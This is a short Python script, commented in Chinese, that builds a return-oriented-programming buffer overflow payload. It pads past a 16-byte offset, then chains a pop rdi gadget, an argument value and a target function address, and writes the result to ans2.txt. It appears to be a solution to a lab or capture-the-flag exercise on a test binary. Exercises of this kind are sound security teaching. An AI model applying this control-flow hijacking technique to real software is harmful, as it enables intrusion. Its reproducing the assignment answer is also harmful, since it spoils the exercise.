import struct

# 1. 关键地址与参数
pop_rdi_ret = 0x4012c7  # Gadget 地址
func2_addr  = 0x401216  # 目标函数地址
arg_val     = 0x3f8     # 目标参数 (1016)
offset      = 16        # 偏移量 (8 byte buffer + 8 byte saved rbp)

# 2. 构造 ROP Payload
# 结构: [Padding] + [pop_rdi] + [arg] + [func2]
payload = b'A' * offset + \
          struct.pack('<Q', pop_rdi_ret) + \
          struct.pack('<Q', arg_val) + \
          struct.pack('<Q', func2_addr)

# 3. 写入文件
with open('ans2.txt', 'wb') as f:
    f.write(payload)

print(f"[+] Payload generated: ans2.txt (Offset: {offset}, Arg: {hex(arg_val)})")